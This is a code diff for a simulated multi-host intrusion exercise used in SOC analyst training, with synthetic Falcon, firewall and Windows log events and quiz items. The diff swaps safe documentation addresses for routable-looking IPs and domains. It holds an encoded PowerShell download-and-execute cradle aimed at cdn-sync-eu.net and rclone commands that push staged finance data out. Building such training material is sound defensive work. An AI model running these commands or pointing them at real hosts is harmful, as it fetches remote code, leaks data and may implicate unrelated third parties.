@@ -25,9 +25,10 @@
  * SOURCES: edr (CrowdStrike Falcon), firewall (Palo Alto NGFW), windows_security
  * (member-server Windows Security log).
  *
- * IOCs are safe by construction: documentation IP ranges (RFC 5737 —
- * 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) and .example domains, so no
- * routable address or real TLD ever appears in the content.
+ * IOCs follow the live feed's convention (validate:feed:integrity D-02): realistic
+ * routable addresses and domains — documentation ranges or .example names would
+ * stand out from the benign noise and give the attack away. No well-known shared
+ * infrastructure (CDN/cloud front-ends) is used as an attacker address.
  *
  * NOTE: register in scenarios.ts with difficulty "advanced".
  */
@@ -51,6 +52,8 @@ export function buildMultiHostIntrusionScenario(
   // rebuild is bit-for-bit identical. Every base offset below is chosen so that
   // adding up to 48 s of jitter cannot reorder two events (all are ≥ 60 s apart,
   // except deliberately sequenced sub-minute steps that carry their own spacing).
+  // A session-end record is written when the session ENDS: start + elapsed.
+  const after = (iso: string, sec: number) => new Date(Date.parse(iso) + sec * SEC).toISOString();
   const J = (baseMs: number, seed: string) => T(baseMs + (2 + (hashString(`jit:${seed}`) % 47)) * SEC);
 
   // One campaign, three host incidents — each its own isolated EDR case.
@@ -68,24 +71,26 @@ export function buildMultiHostIntrusionScenario(
   // the MiniDump — the credential the operator then reuses to reach BKP-SRV-02.
   const svc = { upn: "svc_backup@nexacorp.com", sam: "svc_backup" };
 
-  // Safe C2 / exfil infrastructure (RFC 5737 + .example).
-  const c2 = "cdn-sync-eu.example";
-  const c2ip = "192.0.2.44";
-  const exfilHost = "store.filedrop-transfer.example";
-  const exfilIp = "198.51.100.23";
+  // C2 / exfil infrastructure (realistic hosting addresses, see header).
+  const c2 = "cdn-sync-eu.net";
+  const c2ip = "45.137.101.22";
+  const exfilHost = "store.filedrop-transfer.net";
+  const exfilIp = "185.199.53.14";
 
   const macroDocHash = makeSha256("multihost_invoice_q3_macro_docm_2026");
-  const beaconHash   = makeSha256("multihost_cobalt_beacon_dll_2026");
-  const psexecHash   = makeSha256("multihost_psexesvc_service_2026");
+  // The beacon lives in memory (no file); the images below are genuine, clean
+  // Microsoft binaries — their hashes are NOT indicators of compromise.
+  const psHash       = makeSha256("windows_powershell_exe_system32_clean");
+  const cmdHash      = makeSha256("windows_cmd_exe_system32_clean");
   const rcloneHash   = makeSha256("multihost_renamed_rclone_svchost_update_2026");
 
-  // Full, harmless, decodable -enc payload: a download cradle to a SAFE .example
-  // host (decodes to `IEX (New-Object Net.WebClient).DownloadString(
-  // 'https://cdn-sync-eu.example/agent/stage1.ps1')`). No real malware.
+  // Full, harmless, decodable -enc payload (decodes to `IEX (New-Object
+  // Net.WebClient).DownloadString('https://cdn-sync-eu.net/agent/stage1.ps1')`).
+  // The stage-1 URL is fictional; no real malware is referenced.
   const encPayload =
-    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8Ad" +
-    "wBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHMAeQBuAGMALQBlAHUALg" +
-    "BlAHgAYQBtAHAAbABlAC8AYQBnAGUAbgB0AC8AcwB0AGEAZwBlADEALgBwAHMAMQAnACkA";
+    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8A" +
+    "dwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHMAeQBuAGMALQBlAHUA" +
+    "LgBuAGUAdAAvAGEAZwBlAG4AdAAvAHMAdABhAGcAZQAxAC4AcABzADEAJwApAA==";
 
   const cxN = "nexacorp" as const;
 
@@ -121,8 +126,8 @@ export function buildMultiHostIntrusionScenario(
     panWeb({
       companyId: cxN, id: "evt_mhi_ws1_download", ts: J(0, "ws1"), host: ws.hostname, srcIp: ws.ip, user: victim.email,
       userTitle: "Accounts Payable Clerk", incidentId: INC_WS, severity: "low",
-      url: "https://supplier-invoices-nexa.example/inv/Invoice_Q3_4471.docm", domain: "supplier-invoices-nexa.example",
-      category: "business-and-economy", action: "alert", dstIp: "203.0.113.9", bytesIn: 88_320,
+      url: "https://supplier-invoices-nexa.com/inv/Invoice_Q3_4471.docm", domain: "supplier-invoices-nexa.com",
+      category: "business-and-economy", action: "alert", dstIp: "91.215.85.142", bytesIn: 88_320,
       file: { name: "Invoice_Q3_4471.docm", path: "/inv/Invoice_Q3_4471.docm", sha256: macroDocHash }, fileType: "ms-office",
       description: "FIN-WS-08 downloaded Invoice_Q3_4471.docm from a lookalike supplier portal at 18:40, allowed under the category business-and-economy.",
     }),
@@ -141,7 +146,7 @@ export function buildMultiHostIntrusionScenario(
       processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
       cmdline: `powershell.exe -nop -w hidden -enc ${encPayload}`,
       parentName: "cmd.exe", parentPid: PID.ws_cmd, pid: PID.ws_ps, integrity: "medium",
-      sha256: beaconHash, signed: true, signatureSubject: "Microsoft Corporation",
+      sha256: psHash, signed: true, signatureSubject: "Microsoft Corporation",
       isDetection: true, mitre: "T1059.001", tactic: "Execution", severity: "critical", incidentId: INC_WS,
       description: "cmd.exe launched an encoded PowerShell whose payload decodes to a DownloadString cradle that pulled and injected a Cobalt Strike beacon into memory.",
     }),
@@ -151,9 +156,9 @@ export function buildMultiHostIntrusionScenario(
       domain: c2, resolvedIp: c2ip, qtype: "A",
       processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
       cmdline: `powershell.exe -nop -w hidden -enc ${encPayload}`, pid: PID.ws_ps,
-      parentName: "cmd.exe", parentPid: PID.ws_cmd, sha256: beaconHash,
+      parentName: "cmd.exe", parentPid: PID.ws_cmd, sha256: psHash,
       mitre: "T1071.001", tactic: "Command and Control", severity: "high", incidentId: INC_WS,
-      description: "powershell.exe (the beacon) resolved cdn-sync-eu.example — the DNS request that names the C2 and ties the outbound sessions to the beacon process.",
+      description: "powershell.exe (the beacon) resolved cdn-sync-eu.net — the DNS request that names the C2 and ties the outbound sessions to the beacon process.",
     }),
     // 5. The beacon's outbound C2 session — attributed to powershell on the endpoint.
     csNetwork({
@@ -161,17 +166,17 @@ export function buildMultiHostIntrusionScenario(
       remoteIp: c2ip, remotePort: 443, application: "tls", domain: c2,
       processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
       cmdline: `powershell.exe -nop -w hidden -enc ${encPayload}`, pid: PID.ws_ps,
-      parentName: "cmd.exe", parentPid: PID.ws_cmd, sha256: beaconHash,
+      parentName: "cmd.exe", parentPid: PID.ws_cmd, sha256: psHash,
       mitre: "T1071.001", tactic: "Command and Control", severity: "high", incidentId: INC_WS,
-      description: "The endpoint recorded powershell.exe opening a TLS connection to 192.0.2.44:443 — the beacon's C2 channel, attributed to the beacon process itself.",
+      description: "The endpoint recorded powershell.exe opening a TLS connection to 45.137.101.22:443 — the beacon's C2 channel, attributed to the beacon process itself.",
     }),
     // 6. The firewall's view of the same beacon — an aggregated TLS session summary.
     panConnection({
-      companyId: cxN, id: "evt_mhi_ws6_c2_fw", ts: J(4 * MIN + 30 * SEC, "ws6"), host: ws.hostname, srcIp: ws.ip, user: victim.email,
+      companyId: cxN, id: "evt_mhi_ws6_c2_fw", ts: after(J(4 * MIN, "ws5"), 20), host: ws.hostname, srcIp: ws.ip, user: victim.email,
       end: true, app: "ssl", domain: c2, dstIp: c2ip, category: "unknown", action: "allow",
-      bytesOut: 71_680, bytesIn: 17_920, elapsedSec: 840, repeatCount: 14, sessionEndReason: "tcp-fin",
+      bytesOut: 4_812, bytesIn: 1_365, elapsedSec: 20, sessionEndReason: "tcp-fin",
       mitre: "T1071.001", tactic: "Command and Control", severity: "high", incidentId: INC_WS,
-      description: "The firewall aggregated 14 short TLS sessions from FIN-WS-08 to cdn-sync-eu.example over 14 minutes — a fixed-interval Cobalt Strike malleable-C2 heartbeat. Host only (no decryption), byte totals reported at session end.",
+      description: "The firewall's session-end record for the beacon's TLS session from FIN-WS-08 to cdn-sync-eu.net: 20 seconds, a few kilobytes each way, to an uncategorised, newly seen domain — the shape of a C2 check-in. Host only (no decryption); byte totals are final at session end.",
     }),
     // 7. The Falcon detection that opened incident 1.
     {
@@ -180,7 +185,7 @@ export function buildMultiHostIntrusionScenario(
         threatName: "EncodedPowerShellBeaconUnderOffice", severity: "critical", mitre: "T1059.001", tactic: "Execution",
         technique: "Command and Scripting Interpreter: PowerShell", processTree: "WINWORD.EXE > cmd.exe > powershell.exe",
         processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        cmdline: `powershell.exe -nop -w hidden -enc ${encPayload}`, sha256: beaconHash, pid: PID.ws_ps,
+        cmdline: `powershell.exe -nop -w hidden -enc ${encPayload}`, sha256: psHash, pid: PID.ws_ps,
         parentPath: "C:\\Windows\\System32\\cmd.exe",
         action: "detected", incidentId: INC_WS,
         description: "Falcon raised a Critical detection on FIN-WS-08: encoded PowerShell decoded an in-memory beacon under WINWORD.EXE, with a repeating TLS heartbeat to external infrastructure.",
@@ -202,7 +207,7 @@ export function buildMultiHostIntrusionScenario(
       companyId: cxN, id: "evt_mhi_fs2_psexec", ts: J(19 * MIN + 40 * SEC, "fs2"), host: fs.hostname, srcIp: fs.ip, user: victim.email,
       processName: "cmd.exe", processPath: "C:\\Windows\\System32\\cmd.exe", cmdline: "cmd.exe /c C:\\Windows\\Temp\\d.bat",
       parentName: "PSEXESVC.exe", parentPid: PID.fs_psexesvc, pid: PID.fs_cmd, integrity: "system", runAsUser: "NT AUTHORITY\\SYSTEM",
-      sha256: psexecHash, signed: false, mitre: "T1021.002", tactic: "Lateral Movement",
+      sha256: cmdHash, signed: true, signatureSubject: "Microsoft Corporation", mitre: "T1021.002", tactic: "Lateral Movement",
       severity: "high", incidentId: INC_FS,
       description: "services.exe started PSEXESVC.exe on FS-SRV-03, which spawned cmd.exe as SYSTEM — a PsExec remote-execution landing.",
     }),
@@ -271,7 +276,7 @@ export function buildMultiHostIntrusionScenario(
       companyId: cxN, id: "evt_mhi_bk4_stage", ts: J(34 * MIN, "bk4"), host: bkp.hostname, srcIp: bkp.ip, user: svc.upn,
       processName: "svchost-update.exe", processPath: "C:\\ProgramData\\Adobe\\svchost-update.exe",
       cmdline: "svchost-update.exe copy \\\\FS-SRV-03\\Finance R:\\stage --transfers 16", parentName: "cmd.exe", parentPid: PID.bk_cmd, pid: PID.bk_stage,
-      sha256: rcloneHash, signed: false, originalFileName: "rclone.exe", mitre: "T1560.001", tactic: "Collection", severity: "high", incidentId: INC_BK,
+      sha256: rcloneHash, signed: false, originalFileName: "rclone.exe", mitre: "T1039", tactic: "Collection", severity: "high", incidentId: INC_BK,
       description: "svchost-update.exe — an unsigned binary in ProgramData, PE OriginalFilename rclone.exe — recursively copied \\\\FS-SRV-03\\Finance into R:\\stage on BKP-SRV-02 (the collection step).",
     }),
     // 16. THE EXFIL CRUX — a NEW rclone process (its own PID) pushes the staged archive out.
@@ -283,15 +288,15 @@ export function buildMultiHostIntrusionScenario(
       processName: "svchost-update.exe", processPath: "C:\\ProgramData\\Adobe\\svchost-update.exe",
       cmdline: "svchost-update.exe copy R:\\stage remote:backup --transfers 16", pid: PID.bk_upload, parentName: "cmd.exe", parentPid: PID.bk_cmd,
       sha256: rcloneHash, isDetection: true, mitre: "T1567.002", tactic: "Exfiltration", severity: "critical", incidentId: INC_BK,
-      description: "A second svchost-update.exe invocation (a new process) opened a sustained TLS session to store.filedrop-transfer.example and uploaded the staged R:\\stage volumes.",
+      description: "A second svchost-update.exe invocation (a new process) opened a sustained TLS session to store.filedrop-transfer.net and uploaded the staged R:\\stage volumes.",
     }),
     // 17. The firewall's session-end record of the same upload — where the VOLUME lives.
     panConnection({
-      companyId: cxN, id: "evt_mhi_bk6_fw", ts: J(41 * MIN + 30 * SEC, "bk6"), host: bkp.hostname, srcIp: bkp.ip, user: svc.sam,
+      companyId: cxN, id: "evt_mhi_bk6_fw", ts: after(J(41 * MIN, "bk5"), 60), host: bkp.hostname, srcIp: bkp.ip, user: svc.sam,
       end: true, app: "ssl", domain: exfilHost, dstIp: exfilIp, category: "online-storage-and-backup",
-      action: "allow", bytesOut: 3_650_722_000, bytesIn: 262_144, elapsedSec: 540, sessionEndReason: "tcp-fin",
+      action: "allow", bytesOut: 3_650_722_000, bytesIn: 262_144, elapsedSec: 60, sessionEndReason: "tcp-fin",
       mitre: "T1567.002", tactic: "Exfiltration", severity: "high", incidentId: INC_BK,
-      description: "The firewall's TRAFFIC session-end record: 3.65 GB uploaded from BKP-SRV-02 to store.filedrop-transfer.example over a 540-second session (~54 Mbps), category online-storage-and-backup, allowed. The byte total is final at session close, not at the start.",
+      description: "The firewall's TRAFFIC session-end record: 3.65 GB uploaded from BKP-SRV-02 to store.filedrop-transfer.net over a 60-second session (~490 Mbps on the server's uplink), category online-storage-and-backup, allowed. The byte total is final at session close, not at the start.",
     }),
     // 18. The Falcon detection that opened incident 3.
     {
@@ -302,7 +307,7 @@ export function buildMultiHostIntrusionScenario(
         processName: "svchost-update.exe", processPath: "C:\\ProgramData\\Adobe\\svchost-update.exe",
         cmdline: "svchost-update.exe copy R:\\stage remote:backup --transfers 16", sha256: rcloneHash, pid: PID.bk_upload,
         parentPath: "C:\\Windows\\System32\\cmd.exe", incidentId: INC_BK,
-        description: "Falcon raised a Critical detection on BKP-SRV-02: an unsigned rclone-derived binary archived a file share and transferred multiple gigabytes to an online-storage host.",
+        description: "Falcon raised a Critical detection on BKP-SRV-02: an unsigned rclone-derived binary copied a file share and transferred multiple gigabytes to an online-storage host.",
       }),
       edr_scope: "edr",
     },
@@ -311,7 +316,6 @@ export function buildMultiHostIntrusionScenario(
   const iocs: IOC[] = [
     { type: "domain", value: c2, first_seen: J(3 * MIN + 40 * SEC, "ws4"), last_seen: J(4 * MIN + 30 * SEC, "ws6"), reputation: "malicious", tags: ["c2", "cobalt-strike"] },
     { type: "domain", value: exfilHost, first_seen: J(41 * MIN, "bk5"), last_seen: J(41 * MIN + 30 * SEC, "bk6"), reputation: "malicious", tags: ["exfil", "cloud-storage"] },
-    { type: "sha256", value: beaconHash, first_seen: J(3 * MIN + 12 * SEC, "ws3"), last_seen: J(5 * MIN, "ws7"), reputation: "malicious", tags: ["cobalt-strike", "beacon"] },
     { type: "sha256", value: rcloneHash, first_seen: J(34 * MIN, "bk4"), last_seen: J(43 * MIN, "bk7"), reputation: "malicious", tags: ["rclone", "exfil", "renamed"] },
     { type: "ip", value: c2ip, first_seen: J(3 * MIN + 40 * SEC, "ws4"), last_seen: J(4 * MIN + 30 * SEC, "ws6"), reputation: "malicious", tags: ["c2"] },
     { type: "ip", value: exfilIp, first_seen: J(41 * MIN, "bk5"), last_seen: J(41 * MIN + 30 * SEC, "bk6"), reputation: "malicious", tags: ["exfil"] },
@@ -336,7 +340,7 @@ export function buildMultiHostIntrusionScenario(
       answer: "chain",
       xp: 60,
       explanation:
-        "Correlation across hosts is built from shared entities and a coherent timeline, not from a shared severity or a shared tool. Here n.harel's foothold on FIN-WS-08 (18:43) is followed by a Type-3 logon as n.harel onto FS-SRV-03 (18:59), an LSASS dump there that captures svc_backup (whose service session is live on FS-SRV-03), and then a Type-3 logon as svc_backup onto BKP-SRV-02 from FS-SRV-03 (19:10) before staging \\\\FS-SRV-03\\Finance — each step feeds the next. Same severity (b) and same vendor (c) are true but prove nothing about causation, and Falcon does not auto-merge cross-host detections into one incident. (d) ignores the account and data flow that tie the hosts together.",
+        "Correlation across hosts is built from shared entities and a coherent timeline, not from a shared severity or a shared tool. Here n.harel's foothold on FIN-WS-08 (18:43) is followed by a Type-3 logon as n.harel onto FS-SRV-03 (18:59), an LSASS dump there that captures svc_backup (whose service session is live on FS-SRV-03), and then a Type-3 logon as svc_backup onto BKP-SRV-02 from FS-SRV-03 (19:10) before staging \\\\FS-SRV-03\\Finance — each step feeds the next. Same severity (b) and same vendor (c) are true but prove nothing about causation, and here the three detections were raised as three separate cases — tying them together is the analyst's job. (d) ignores the account and data flow that tie the hosts together.",
     },
     {
       id: "q2",
@@ -378,13 +382,13 @@ export function buildMultiHostIntrusionScenario(
         // correct — NOT the longest
         { value: "all", label: "Network-contain all three hosts, reset n.harel and every account in the LSASS dump (svc_backup included), block the C2 and exfil domains, and treat the finance share as exfiltrated" },
         { value: "ws_only", label: "Isolate FIN-WS-08 first because it is patient zero, then monitor the other two for beaconing, on the basis that cutting the entry point halts any chain that started there before creds were reused" },
-        { value: "block_dns", label: "Block cdn-sync-eu.example and store.filedrop-transfer.example at the firewall and sinkhole their IPs, since severing C2 and the exfil path neutralises the operator once the endpoints can no longer reach infrastructure" },
+        { value: "block_dns", label: "Block cdn-sync-eu.net and store.filedrop-transfer.net at the firewall and sinkhole their IPs, since severing C2 and the exfil path neutralises the operator once the endpoints can no longer reach infrastructure" },
         { value: "reimage", label: "Reimage BKP-SRV-02 to remove the rclone-derived tool and rotate its local admin, treating the other two hosts as clean because no data-loss event fired on either of them" },
       ],
       answer: "all",
       xp: 60,
       explanation:
-        "By the time you are looking, the operator holds credentials from FS-SRV-03, has already reused svc_backup to reach a third host, and has pushed data out — so containment has to cover all three hosts at once, invalidate the stolen credentials (a password reset does nothing about a dumped NTLM hash still usable for pass-the-hash, so reset AND rotate/monitor service accounts), and assume the finance share left the building. (b) is false because the operator already pivoted off patient zero with stolen creds. (c) cuts C2 but leaves live credentials and on-host tooling. (d) ignores the credential theft and the foothold on the other two hosts.",
+        "By the time you are looking, the operator holds credentials from FS-SRV-03, has already reused svc_backup to reach a third host, and has pushed data out — so containment has to cover all three hosts at once, invalidate the stolen credentials (reset every exposed account — that also kills the dumped NTLM hashes — rotate svc_backup wherever it is configured, and revoke existing sessions and Kerberos tickets, which a reset alone does not end), and assume the finance share left the building. (b) is false because the operator already pivoted off patient zero with stolen creds. (c) cuts C2 but leaves live credentials and on-host tooling. (d) ignores the credential theft and the foothold on the other two hosts.",
     },
   ];
 
@@ -395,11 +399,11 @@ export function buildMultiHostIntrusionScenario(
     attack_kind: "multi_host_intrusion",
     briefing:
       "Three CrowdStrike Falcon detections fired on three different hosts — FIN-WS-08, FS-SRV-03 and BKP-SRV-02 — inside 40 minutes tonight. Each opened as its own incident. Work out whether they are one campaign, what the operator took, and how far it spread before you contain it.",
-    narrative: `At 18:40 Noa Harel in Accounts Payable opened Invoice_Q3_4471.docm from a lookalike supplier portal and enabled the macro. WINWORD.EXE spawned cmd.exe, which ran an encoded PowerShell that decoded a download cradle and injected a Cobalt Strike beacon; from 18:44 FIN-WS-08 was beaconing to cdn-sync-eu.example. That is incident one.
+    narrative: `At 18:40 Noa Harel in Accounts Payable opened Invoice_Q3_4471.docm from a lookalike supplier portal and enabled the macro. WINWORD.EXE spawned cmd.exe, which ran an encoded PowerShell that decoded a download cradle and injected a Cobalt Strike beacon; from 18:44 FIN-WS-08 was beaconing to cdn-sync-eu.net. That is incident one.
 
 Fifteen minutes later the operator used Noa's session to reach the file server. A Type-3 logon for n.harel arrived on FS-SRV-03 from FIN-WS-08 at 18:59, PsExec dropped PSEXESVC.exe and a SYSTEM shell, and at 19:00 rundll32.exe called comsvcs.dll MiniDump against lsass.exe with full access, writing lsass.dmp. Because svc_backup — a backup service account — has a live service session on FS-SRV-03, its secret was in that dump. That is incident two, and it is where a single-workstation problem became a credential problem.
 
-At 19:10 svc_backup logged on to BKP-SRV-02 from FS-SRV-03, PsExec installed its service there too, and by 19:14 an unsigned binary named svchost-update.exe (PE OriginalFilename rclone.exe) began copying \\\\FS-SRV-03\\Finance into R:\\stage. A second rclone invocation at 19:21 pushed 3.65 GB to store.filedrop-transfer.example. That is incident three.
+At 19:10 svc_backup logged on to BKP-SRV-02 from FS-SRV-03, PsExec installed its service there too, and by 19:14 an unsigned binary named svchost-update.exe (PE OriginalFilename rclone.exe) began copying \\\\FS-SRV-03\\Finance into R:\\stage. A second rclone invocation at 19:21 pushed 3.65 GB to store.filedrop-transfer.net. That is incident three.
 
 Falcon raised all three as separate Critical detections. Nothing was contained. The night-shift analyst catches the third alert at 19:23 — before the ransomware stage, but after the data has left.`,
     learning_objectives: [
@@ -419,7 +423,7 @@ Falcon raised all three as separate Critical detections. Nothing was contained. 
       { ts: J(19 * MIN, "fs1"), phase: "Lateral Movement", action: "Type-3 logon FIN-WS-08 → FS-SRV-03; PsExec landing (T1021.002)" },
       { ts: J(20 * MIN + 30 * SEC, "fs3"), phase: "Credential Access", action: "LSASS MiniDump via comsvcs.dll on FS-SRV-03 captures svc_backup (T1003.001)" },
       { ts: J(30 * MIN, "bk0"), phase: "Lateral Movement", action: "svc_backup (stolen) logs on to BKP-SRV-02 from FS-SRV-03; PsExec + 7045 (T1021.002)" },
-      { ts: J(34 * MIN, "bk4"), phase: "Collection", action: "Renamed rclone stages \\\\FS-SRV-03\\Finance on BKP-SRV-02 (T1560.001)" },
+      { ts: J(34 * MIN, "bk4"), phase: "Collection", action: "Renamed rclone stages \\\\FS-SRV-03\\Finance on BKP-SRV-02 (T1039)" },
       { ts: J(41 * MIN, "bk5"), phase: "Exfiltration", action: `3.65 GB pushed to ${exfilHost} (T1567.002)` },
       { ts: J(43 * MIN, "bk7"), phase: "Detection", action: "Third Falcon detection — analyst intervenes before ransomware" },
     ],
